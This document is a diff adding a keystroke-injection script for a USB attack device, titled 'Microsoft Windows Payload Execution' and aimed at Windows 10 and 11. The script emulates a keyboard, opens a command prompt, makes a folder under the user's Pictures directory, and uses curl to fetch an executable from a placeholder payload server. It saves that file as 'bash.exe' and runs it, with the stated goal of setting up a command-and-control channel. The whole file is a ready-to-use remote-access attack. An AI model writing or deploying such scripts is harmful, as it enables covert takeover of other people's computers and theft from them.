@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Title:            Microsoft Windows Payload Execution
+#
+# Description:      
+#                   1) Create a directory for the payload to be executed
+#                   2) Obtain the payload from payload server
+#                   3) Execute the payload and establish C2 channel
+#
+# Author:           5ly
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Microsoft Windows 10 & 11
+
+LED SETUP
+ATTACKMODE HID
+#Variables
+readonly PAYLOAD_DOWNLOAD_URI="ENTER PAYLOAD URI HERE"
+
+#Create Directory
+
+LED ATTACK
+Q GUI r
+Q STRING "cmd"
+Q ENTER
+Q DELAY 10000
+Q STRING "mkdir %USERPROFILE%\Pictures\pics;cd %USERPROFILE%\Pictures\pics"
+Q STRING "curl ${PAYLOAD_DOWNLOAD_URI} -o bash.exe"
+Q STRING ./bash.exe
+Q ENTER
+Q DELAY 250
+
+LED FINISH
